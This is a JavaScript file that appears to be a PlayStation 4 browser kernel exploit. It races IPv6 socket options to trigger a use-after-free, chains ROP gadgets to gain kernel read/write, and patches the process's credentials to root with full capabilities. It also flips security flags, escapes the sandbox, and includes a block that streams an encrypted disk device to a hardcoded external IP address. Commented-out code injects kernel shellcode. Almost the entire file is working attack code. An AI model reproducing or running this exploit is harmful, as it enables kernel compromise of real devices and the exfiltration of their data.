  const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
  const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
  const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_pktinfo_buffer = 0x18;
  const size_of_pktinfo_buffer_len = 0x8;
  const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
  const size_of_fake_socketops = 0x58;
  const size_of_loop_counter = 0x8;
  const size_of_fix_these_sockets = 0x4 * (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2) + 0x18;
  const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
    size_of_rthdr_buffer + size_of_ptr_size_of_rthdr_buffer+ size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
    size_of_fix_these_sockets
  );

  const triggered = var_memory;
  const valid_pktopts = triggered.add32(size_of_triggered);
  const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
  const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
  const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
  const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
  const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
  const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
  const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
  const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
  const ptr_size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
  const spray_sockets_ptr = ptr_size_of_rthdr_buffer.add32(size_of_ptr_size_of_rthdr_buffer);
  const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
  const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
  const spray_socks_tclasses_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
  const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
  const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
  const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
  const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
  const loop_counter = fake_socketops.add32(size_of_fake_socketops);
  const fix_these_sockets_ptr = loop_counter.add32(size_of_loop_counter);

  var overlapped_socket = -1;
  var overlapped_socket_idx = -1;

  var slave_socket = -1;

  var leaked_pktopts_address = 0;

  var target_file;
  var socketops;
  var kernel_base;

  p.write8(valid_pktopts.add32(0x0), 0x14);
  p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
  p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
  p.write4(valid_pktopts.add32(0x10), 0x0);

  p.write8(size_of_tclass, 0x4);
  p.write8(spray_tclass, SPRAY_TCLASS);

  p.write8(master_main_tclass, 0x0);
  p.write8(master_thr1_tclass, 0x0);
  p.write8(master_thr2_tclass, 0x0);

  p.write8(taint_tclass, TAINT_CLASS);
  p.write8(tmp_tclass, 0x10);

  p.write8(pktinfo_buffer_len, 0x14);

  //create sockets
  const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;

  const this_pid = chain.syscall(20).low;

  {

    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(leak_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
    }
  }
  chain.run();

  const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
  const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);

  const leak_sockets = p.array_from_address(leak_sockets_ptr, NUM_LEAK_SOCKS);
  const slave_sockets = p.array_from_address(slave_sockets_ptr, NUM_SLAVE_SOCKS);

  const fix_me = p.array_from_address(fix_these_sockets_ptr, NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2);

  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    fix_me[i] = spray_sockets[i];
  }
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    fix_me[i + NUM_SPRAY_SOCKS] = leak_sockets[i];
  }
  for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
    fix_me[i + (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS)] = slave_sockets[i];
  }

  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;

  for (var i = 0; i < 10; i++) {
    p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
  }
  p.write8(fake_socketops.add32(0x50), 1);

  var thr1_start;
  var thr1_ctrl;
  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
    const loop_start = new_thr.get_rsp();
    const trigger_condition = new_thr.create_equal_branch(triggered, 1);

    const triggered_false = new_thr.get_rsp();
    new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
    const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);

    const overlap_false = new_thr.get_rsp();
    new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    new_thr.push(window.gadgets["pop rdi"]);
    var dest_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["pop rsi"]);
    var src_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["mov [rdi], rsi"]);
    var l1 = new_thr.get_rsp();
    new_thr.push(window.gadgets["pop rsp"]);
    var l2 = new_thr.get_rsp();
    new_thr.push(0x43434343);

    new_thr.finalizeSymbolic(dest_idx, l2);
    new_thr.finalizeSymbolic(src_idx, l1);
    thr1_start = loop_start;
    thr1_ctrl = l2;

    const overlap_true = new_thr.get_rsp();
    new_thr.push_write8(triggered, 1);

    const triggered_true = new_thr.get_rsp();
    new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
  });

  //boys dont race too fast now, kthx.
  var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
  var prio = p.malloc(0x8);
  p.write4(prio, 0x100);
  var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);

  const thread3 = new rop(); {
    //main loop
    const loop_start = thread3.get_rsp();
    //set valid.
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    //make thr1 give it a go
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
    }
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
    const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);
    const overlap_false = thread3.get_rsp();
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    thread3.jmp_rsp(loop_start);
    const overlap_true = thread3.get_rsp();
    thread3.push_write8(triggered, 1);
    thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
    }
    //make sure the thread will exit(?)
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
  }
  //trigger uaf
  thread1();
  thread3.run();

  function find_socket_overlap() {
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      if (spray_socks_tclasses[i] == TAINT_CLASS) {
        overlapped_socket = spray_sockets[i];
        overlapped_socket_idx = i;
        return;
      }
    }
    alert("[ERROR] -> failed to find socket overlap. (should be unreachable) REBOOT");
    while (1) {};
  }

  function fake_pktopts(pktinfo) {
    {

      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
      chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
      chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
      chain.push_write8(loop_counter, 0);
      chain.push_write8(tmp_tclass, 0x1);
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
      chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

      const loop_start = chain.get_rsp();
      const loop_condition = chain.create_equal_branch(loop_counter, 0x100);

      const loop_condition_false = chain.get_rsp();
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
        chain.syscall_safe(105, leak_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
      }
      chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
      const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);

      const overlap_false = chain.get_rsp();
      chain.push(window.gadgets["pop rax"]);
      chain.push(loop_counter);
      chain.push(window.gadgets["inc dword [rax]"]);
      chain.jmp_rsp(loop_start);

      const loop_condition_true = chain.get_rsp();
      const overlap_true = chain.get_rsp();

      chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
      chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
    }
    chain.run();

    const tclass = p.read4(tmp_tclass);
    if ((tclass & 0xFFFF0000) == TCLASS_MASTER) {
      overlapped_socket_idx = (tclass & 0x0000FFFF);
      overlapped_socket = leak_sockets[overlapped_socket_idx];
      return;
    }
    alert("[ERROR] failed to find RTHDR <-> master socket overlap REBOOT");
    while (1) {};

  }

  function leak_rthdr_address(size) {
    const ip6r_len = ((size >> 3) - 1 & ~1);
    const ip6r_segleft = (ip6r_len >> 1);
    const header = (ip6r_len << 8) + (ip6r_segleft << 24); {
      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
      chain.push_write8(rthdr_buffer, header);
      chain.push_write8(ptr_size_of_rthdr_buffer, size);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
      chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ptr_size_of_rthdr_buffer);
    }
    chain.run();
    const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
    return kaddress;
  }

  function leak_pktopts() {
    leaked_pktopts_address = leak_rthdr_address(0x100); {
      chain.push_write8(tmp_tclass, 0x10);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[105], slave_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
    }
    chain.run();
  }

  function find_slave() {
    {
      chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[118], slave_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
      }
    }
    chain.run();

    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      if (p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
        slave_socket = slave_sockets[i];
        return;
      }
    }
    alert("[ERROR] failed to find slave REBOOT");
    while (1) {};
  }

  function kernel_read8(address) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len)
    }
    chain.run();
    return p.read8(pktinfo_buffer);
  }

  function kernel_write8(address, value) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len);
      chain.push_write8(pktinfo_buffer, value);
      chain.fcall(syscalls[105], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
    }
    chain.run();
  }

  function brute_force_kernel_map() {
	kernel_base = new int64(0x80200000, 0xFFFFFFFF);//static
  }

  function find_proc() {
    var proc = kernel_read8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
    while (proc.low != 0) {
      var pid = kernel_read8(proc.add32(PROC_PID_OFFSET));
      if (pid.low == this_pid) {
        return proc;
      }
      proc = kernel_read8(proc);
    }
    alert("[ERROR] failed to find proc REBOOT");
    while (1) {};
  }

  function find_execution_socket() {

    var filedesc = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
    var ofiles = kernel_read8(filedesc);
    target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
    socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
  }
  //lower priority
  p.write4(prio, 0x1FF);
  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
  //find uaf
  find_socket_overlap();
  //play with uaf
  //alert("play");
  fake_pktopts(0);
  leak_sockets[overlapped_socket_idx] = spare_socket;
  //leak shit
  //alert("leak");
  leak_pktopts();
  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
  //alert("find victim");
  find_slave();
  brute_force_kernel_map();
  const proc = find_proc();
  //alert("here we go!");
  const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
  const proc_fd = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
  
  
  // dump code (slow) - specter
  function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
  }

  function aton(ip) {
      let chunks = ip.split('.');
      let addr = 0;
      for(let i = 0; i < 4; i++) {
          addr |= (parseInt(chunks[i]) << (i * 8));
      }
      return addr >>> 0;
  }

  function build_addr(buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
  }

  const DUMP_NET_IP   = "89.181.169.194"; // edit this, mr SocraticBliss
  let DUMP_NET_ADDR = aton(DUMP_NET_IP); 
  let DUMP_NET_PORT = htons(5656);

  let dump_sock_addr_store    = p.malloc(0x10);
  let dump_sock_send_sz_store = p.malloc(0x4);
  let dump_sock_connected     = 0;



  for (let i = 0; i < 0x10; i += 0x8) {
    p.write8(dump_sock_addr_store.add32(i), 0);
  }

  build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, DUMP_NET_ADDR);
  

  
  const ROOTVNODE_OFFSET = 0x83EE780;
  const SFF_OFFSET = 0x8117FF4;
  const QAF_OFFSET = 0x8118018;
  const UTF_OFFSET = 0x8118080;
  const PRISON_OFFSET = 0x2B7B5B0;
  
  /*
  //CORRECT SUPPOSED QA FLAGS
	00 00 03 01 00 00 00 00
	//CORRECT SUPPOSED UTOKEN FLAGS
	01 00 00 00 00 00 00 00
	//CORRECT SUPPOSED SECURITY FLAGS
	17 00 00 00 00 00 00 01
  */
  alert("before:");
  alert("qaf: " + kernel_read8(kernel_base.add32(QAF_OFFSET)));
  alert("utf: " + kernel_read8(kernel_base.add32(UTF_OFFSET)));
  alert("sff: " + kernel_read8(kernel_base.add32(SFF_OFFSET)));
  
  alert("cr_uid cr_ruid : " + kernel_read8(proc_ucred.add32(0x4)));
  alert("cr_svuid cr_ngroups : " + kernel_read8(proc_ucred.add32(0xC)));
  //alert("cr_prison: " + kernel_read8(proc_ucred.add32(0x30)));
  alert("authid: "  + kernel_read8(proc_ucred.add32(0x58)));
  alert("cr_caps: " + kernel_read8(proc_ucred.add32(0x60)));
  alert("cr_caps: " + kernel_read8(proc_ucred.add32(0x68)));
  alert("fd_rdir: " + kernel_read8(proc_fd.add32(0x10)));
  alert("fd_jdir: " + kernel_read8(proc_fd.add32(0x18)));
  

  
  //patch flags and tokens
  kernel_write8(kernel_base.add32(QAF_OFFSET), new int64(0x01030000, 0x00000000));
  kernel_write8(kernel_base.add32(UTF_OFFSET), new int64(0x00000001, 0x00000000));
  kernel_write8(kernel_base.add32(SFF_OFFSET), new int64(0x00000017, 0x01000000, ));
  
  //rootvnode shit
  let rootvnode_area_store = kernel_read8(kernel_base.add32(ROOTVNODE_OFFSET));
  let prison_store		   = kernel_read8(kernel_base.add32(PRISON_OFFSET));
  
  // Patch creds
  kernel_write8(proc_ucred.add32(0x04), new int64(0x00000000, 0x00000000));// cr_uid 0 cr_ruid 0
  kernel_write8(proc_ucred.add32(0x0C), new int64(0x00000000, 0x01000000));// cr_svuid 0 cr_ngroups 1
  //kernel_write8(proc_ucred.add32(0x30), prison_store);//not yet checked but should be, cr_prison
  kernel_write8(proc_ucred.add32(0x58), new int64(0x00000048, 0x10000000));//checked, cr_sceAuthID
  kernel_write8(proc_ucred.add32(0x60), new int64(0xffffffff, 0xffffffff));//checked, cr_sceCaps[0]
  kernel_write8(proc_ucred.add32(0x68), new int64(0xffffffff, 0xffffffff));//checked, cr_sceCaps[1]
  

  // Escape sandbox
  kernel_write8(proc_fd.add32(0x10), rootvnode_area_store);  // fd_rdir
  kernel_write8(proc_fd.add32(0x18), rootvnode_area_store);  // fd_jdir
  
  alert("qaf: " + kernel_read8(kernel_base.add32(QAF_OFFSET)));
  alert("utf: " + kernel_read8(kernel_base.add32(UTF_OFFSET)));
  alert("sff: " + kernel_read8(kernel_base.add32(SFF_OFFSET)));
  
  alert("cr_uid 0 cr_ruid 0: " + kernel_read8(proc_ucred.add32(0x4)));
  alert("cr_svuid 0 cr_ngroups 1: " + kernel_read8(proc_ucred.add32(0xC)));
  //alert("cr_prison: " + kernel_read8(proc_ucred.add32(0x30)));
  alert("authid: " + kernel_read8(proc_ucred.add32(0x58)));
  alert("cr_caps all ff: " + kernel_read8(proc_ucred.add32(0x60)));
  alert("cr_caps all ff: " + kernel_read8(proc_ucred.add32(0x68)));
  alert("fd_rdir: " + kernel_read8(proc_fd.add32(0x10)));
  alert("fd_jdir: " + kernel_read8(proc_fd.add32(0x18)));
  
  
  

  let buf = p.malloc(0x1000);
  let fd = chain.syscall(0x005,"/dev/da0x12.crypt", 0);//open O_RDONLY
  if(fd.low == 0xffffffff){
    alert("failed to open, error -1");
  }
  else{
    alert("opened successfully, 0x" + fd);
  }

  let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);//connect
  alert("connected dump sock? 0x" + connect_res);

  for (let pfn = 0; ; pfn++) {
      let read = chain.syscall(0x003, fd, buf, 0x1000);//read
    let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
    
  if(pfn == 0){  
      
    if(read.low == 0xffffffff){
      alert("failed to read, error -1");
	  break;
    }
    else{
    alert("read successfully, 0x" + read);
    }
    
    if(write.low == 0xffffffff){
      alert("failed to write, error -1");
	  break;
    }
    else{
    alert("written successfully, 0x" + write);
    }
  }
  }

  // end dump code
  
/*
  kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));

  //find_execution_socket();
  var exec_handle = chain.syscall(533, 0, 0x100000, 7);
  var write_handle = chain.syscall(534, exec_handle, 3);
  var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
  var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
  chain.syscall(324, 1);
  if(exec_address.low != 0x90000000) {
      alert("[ERROR] failed to allocate jit memory REBOOT");
      while(1){};
  }
  var exec_writer = p.array_from_address(write_address, 0x4000);
  for(var i = 0; i < 0x200; i++) {
      exec_writer[i] = 0x90909090;
  }
  exec_writer[0x200] = 0x37C0C748;
  exec_writer[0x201] = 0xC3000013;
  if(chain.call(exec_address).low != 0x1337) {
      alert("[ERROR] hmm weird REBOOT");
      while(1){};
  }

  exec_writer[0] = 0x54415355;
  exec_writer[1] = 0x1111BB48;
  exec_writer[2] = 0x11111111;
  exec_writer[3] = 0xBD481111;
  exec_writer[4] = 0x22222222;
  exec_writer[5] = 0x22222222;
  exec_writer[6] = 0xBFE4314D;
  exec_writer[7] = 0x000000C0;
  exec_writer[8] = 0xBADE8948;
  exec_writer[9] = 0x00000002;
  exec_writer[10] = 0x8349D5FF;
  exec_writer[11] = 0x814901C4;
  exec_writer[12] = 0x000500FC;
  exec_writer[13] = 0x41E47500;
  exec_writer[14] = 0x655D5B5C;
  exec_writer[15] = 0x25048B48;
  exec_writer[16] = 0x00000000;
  exec_writer[17] = 0x08408B48;
  exec_writer[18] = 0x48408B48;
  exec_writer[19] = 0x48008B48;
  exec_writer[20] = 0x333333B9;
  exec_writer[21] = 0x33333333;
  exec_writer[22] = 0xC7C74833;
  exec_writer[23] = 0x000002BE; // num sockets
  exec_writer[24] = 0x48F63148;
  exec_writer[25] = 0x117DFE39;
  exec_writer[26] = 0x48B1148B;
  exec_writer[27] = 0x00D004C7;
  exec_writer[28] = 0x48000000;
  exec_writer[29] = 0xEB01C683;
  exec_writer[30] = 0x44BF48EA;
  exec_writer[31] = 0x44444444;
  exec_writer[32] = 0x48444444;
  exec_writer[33] = 0x555555BE;
  exec_writer[34] = 0x55555555;
  exec_writer[35] = 0x37894855;
  exec_writer[36] = 0x6666BF48;
  exec_writer[37] = 0x66666666;
  exec_writer[38] = 0x200F6666;
  exec_writer[39] = 0xFF2548C0;
  exec_writer[40] = 0x0FFFFEFF;
  exec_writer[41] = 0x87C6C022;
  exec_writer[42] = 0x0063A160;
  exec_writer[43] = 0xC087C7C3;
  exec_writer[44] = 0x480063AC;
  exec_writer[45] = 0xC7C3C031;
  exec_writer[46] = 0x639F1087;
  exec_writer[47] = 0xC0314800;
  exec_writer[48] = 0xE087C7C3;
  exec_writer[49] = 0x480063A6;
  exec_writer[50] = 0xC6C3C031;
  exec_writer[51] = 0x67B5C087;
  exec_writer[52] = 0xBE480002;
  exec_writer[53] = 0x90909090;
  exec_writer[54] = 0x8B499090;
  exec_writer[55] = 0x08B78948;
  exec_writer[56] = 0xC700264C;
  exec_writer[57] = 0x087B7087;
  exec_writer[58] = 0x0000B800;
  exec_writer[59] = 0x9087C700;
  exec_writer[60] = 0x00000004;
  exec_writer[61] = 0x66000000;
  exec_writer[62] = 0x04B987C7;
  exec_writer[63] = 0x90900000;
  exec_writer[64] = 0xBD87C766;
  exec_writer[65] = 0x90000004;
  exec_writer[66] = 0x87C76690;
  exec_writer[67] = 0x000004C6;
  exec_writer[68] = 0x87C6E990;
  exec_writer[69] = 0x001D2336;
  exec_writer[70] = 0x3987C637;
  exec_writer[71] = 0x37001D23;
  exec_writer[72] = 0xC187C766;
  exec_writer[73] = 0x9000094E;
  exec_writer[74] = 0x87C766E9;
  exec_writer[75] = 0x0009547B;
  exec_writer[76] = 0x87C7E990;
  exec_writer[77] = 0x002F2C20;
  exec_writer[78] = 0xC3C03148;
  exec_writer[79] = 0x7087C748;
  exec_writer[80] = 0x02011258;
  exec_writer[81] = 0x48000000;
  exec_writer[82] = 0xB192B78D;
  exec_writer[83] = 0x89480006;
  exec_writer[84] = 0x125878B7;
  exec_writer[85] = 0x9C87C701;
  exec_writer[86] = 0x01011258;
  exec_writer[87] = 0x48000000;
  exec_writer[88] = 0x0100000D;
  exec_writer[89] = 0xC0220F00;
  exec_writer[90] = 0x8080B848;
  exec_writer[91] = 0x80808080;
  exec_writer[92] = 0x90C38080;

  p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
  p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
  p.write8(write_address.add32(0x51), fix_these_sockets_ptr);

  p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
  //p.write8(write_address.add32(0x85), socketops);
  p.write8(write_address.add32(0x92), kernel_base);

  p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
  kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
  chain.syscall(54, target_socket, 0x20001111, 0);
  alert("executed in kernel");
  //p.write8(0, 0);
  */
}

const stack_sz = 0x40000;
const reserve_upper_stack = 0x8000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
  this.stackback = p.malloc32(stack_sz / 4 + 0x8);
  this.stack = this.stackback.add32(reserve_upper_stack);
  this.stack_array = this.stackback.backing;
  this.retval = this.stackback.add32(stack_sz);
  this.count = 1;
  this.branches_count = 0;
  this.branches_rsps = p.malloc(0x200);

  this.clear = function () {
    this.count = 1;
    this.branches_count = 0;

    for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
      this.stack_array[i + stack_reserved_idx] = 0;
    }
  };

  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  }

  this.finalizeSymbolic = function (idx, val) {
    if (val instanceof int64) {
      this.stack_array[stack_reserved_idx + idx * 2] = val.low;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
    } else {
      this.stack_array[stack_reserved_idx + idx * 2] = val;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
    }
  }

  this.push = function (val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  }

  this.push_write8 = function (where, what) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["pop rsi"]);
    this.push(what);
    this.push(gadgets["mov [rdi], rsi"]);
  }

  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }

    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }

    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }

    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }

    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }

    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }

    this.push(rip);
    return this;
  }

  this.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
    this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
    this.write_result(this.retval);
    this.run();
    return p.read8(this.retval);
  }

  this.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
    return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
  }

  //get rsp of the next push
  this.get_rsp = function () {
    return this.stack.add32(this.count * 8);
  }
  this.write_result = function (where) {
